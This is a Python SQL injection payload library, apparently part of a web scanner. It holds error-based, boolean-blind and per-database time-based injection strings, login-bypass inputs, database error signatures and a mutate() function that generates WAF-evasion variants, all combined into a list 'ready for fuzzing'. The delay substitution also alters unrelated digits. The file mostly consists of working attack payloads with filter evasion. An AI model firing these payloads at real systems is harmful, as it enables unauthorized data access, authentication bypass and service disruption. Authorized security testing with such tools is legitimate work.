"""
SQL Injection payload library.
Organised by detection technique and database flavour.
"""

from __future__ import annotations
import urllib.parse


# ── Error-triggering payloads ─────────────────────────────────────────────────

ERROR_PAYLOADS: list[str] = [
    # Generic single-quote
    "'",
    "''",
    "`",
    "\"",
    # Comment-based
    "'--",
    "'-- -",
    "'#",
    "') --",
    "') -- -",
    # Double injection
    "1' AND '1'='1",
    "1' AND '1'='2",
    # UNION fingerprint
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    # Stacked
    "'; SELECT SLEEP(0)--",
    "1; SELECT 1--",
]

# ── Boolean-based blind payloads ──────────────────────────────────────────────

BOOLEAN_PAYLOADS_TRUE: list[str] = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "1 OR 1=1",
    "1' OR '1'='1'--",
    "admin'--",
    "admin' #",
    "' OR 'x'='x",
    "') OR ('x'='x",
    "\" OR \"\"=\"",
    "\" OR 1=1--",
    "1 OR 1=1--",
    "or 1=1",
    "or 1=1--",
    "or 1=1#",
    "or 1=1/*",
    "') or '1'='1'--",
    "') or ('1'='1",
]

BOOLEAN_PAYLOADS_FALSE: list[str] = [
    "' OR '1'='2",
    "' OR 1=2--",
    "1 OR 1=2",
    "' AND '1'='2",
    "' AND 1=2--",
]

# ── Time-based blind payloads (per DBMS) ──────────────────────────────────────

TIME_PAYLOADS: dict[str, list[str]] = {
    "mysql": [
        "' AND SLEEP(5)--",
        "' OR SLEEP(5)--",
        "1 AND SLEEP(5)",
        "1; WAITFOR DELAY '0:0:5'--",  # mistakenly sent to MySQL — harmless
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "'; SELECT SLEEP(5)--",
        "1' AND SLEEP(5) AND '1'='1",
    ],
    "mssql": [
        "'; WAITFOR DELAY '0:0:5'--",
        "1; WAITFOR DELAY '0:0:5'",
        "' WAITFOR DELAY '0:0:5'--",
        "1 WAITFOR DELAY '0:0:5'",
    ],
    "postgresql": [
        "'; SELECT pg_sleep(5)--",
        "' OR 1=1; SELECT pg_sleep(5)--",
        "1; SELECT pg_sleep(5)",
        "' AND 1=(SELECT 1 FROM pg_sleep(5))--",
    ],
    "oracle": [
        "' OR 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--",
        "1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)",
    ],
    "sqlite": [
        "' OR RANDOMBLOB(500000000/2)--",
        "1 AND RANDOMBLOB(500000000)",
    ],
}

ALL_TIME_PAYLOADS: list[str] = [p for ps in TIME_PAYLOADS.values() for p in ps]

# ── DB-specific error signatures ──────────────────────────────────────────────

DB_ERRORS: dict[str, list[str]] = {
    "mysql": [
        "you have an error in your sql syntax",
        "warning: mysql",
        "mysql_fetch",
        "mysql_num_rows",
        "supplied argument is not a valid mysql",
        "unclosed quotation mark after the character string",
        "com.mysql.jdbc",
        "org.gjt.mm.mysql",
    ],
    "mssql": [
        "unclosed quotation mark after the character string",
        "incorrect syntax near",
        "mssql_query",
        "odbc sql server driver",
        "microsoft ole db provider for sql server",
        "microsoft sql native client error",
        "[sql server]",
        "sqlsrv_connect",
        "sqlncli",
    ],
    "postgresql": [
        "pg_query",
        "pg_exec",
        "unterminated quoted string at or near",
        "pg::syntaxerror",
        "syntax error at or near",
        "psycopg2",
        "org.postgresql",
    ],
    "oracle": [
        "ora-00933",
        "ora-00907",
        "ora-00942",
        "oracle error",
        "oracle driver",
        "oci_parse",
    ],
    "sqlite": [
        "sqlite3::query",
        "sqlite_array_query",
        "sqlite_prepare",
        "sqliteexception",
        "near \"",
        "sqlite error",
    ],
    "generic": [
        "sql syntax",
        "sql error",
        "database error",
        "invalid query",
        "query failed",
        "odbc error",
        "jdbc error",
        "syntax error",
        "unrecognized token",
        "quoted string not properly terminated",
    ],
}

ALL_DB_ERRORS: list[str] = [e for errs in DB_ERRORS.values() for e in errs]


# ── WAF bypass mutations ──────────────────────────────────────────────────────

def mutate(payload: str) -> list[str]:
    """Return several WAF-bypass variants of a payload."""
    variants = [payload]

    # URL encoding
    variants.append(urllib.parse.quote(payload))

    # Double URL encoding
    variants.append(urllib.parse.quote(urllib.parse.quote(payload)))

    # Case variations
    variants.append(payload.upper())
    variants.append(payload.lower())

    # Comment insertion (/**/ replaces spaces)
    variants.append(payload.replace(" ", "/**/"))

    # Inline comments
    variants.append(payload.replace("SELECT", "SEL/**/ECT")
                           .replace("UNION", "UN/**/ION")
                           .replace("WHERE", "WH/**/ERE"))

    # Plus signs instead of spaces (for URL params)
    variants.append(payload.replace(" ", "+"))

    # MySQL /*!...*/ versioned comments
    if "SLEEP" in payload.upper():
        variants.append(payload.replace("SLEEP", "/*!SLEEP*/"))
    if "UNION" in payload.upper():
        variants.append(payload.replace("UNION", "/*!50000UNION*/"))

    # Deduplicate while preserving order
    seen = set()
    out  = []
    for v in variants:
        if v not in seen:
            seen.add(v)
            out.append(v)
    return out


def get_all_sqli_payloads(time_delay: int = 5) -> list[str]:
    """Return a combined, deduplicated payload list ready for fuzzing."""
    combined = (
        ERROR_PAYLOADS
        + BOOLEAN_PAYLOADS_TRUE
        + BOOLEAN_PAYLOADS_FALSE
        + ALL_TIME_PAYLOADS
    )
    # Substitute configurable delay
    combined = [p.replace("5", str(time_delay)) for p in combined]
    return list(dict.fromkeys(combined))   # deduplicate, preserve order
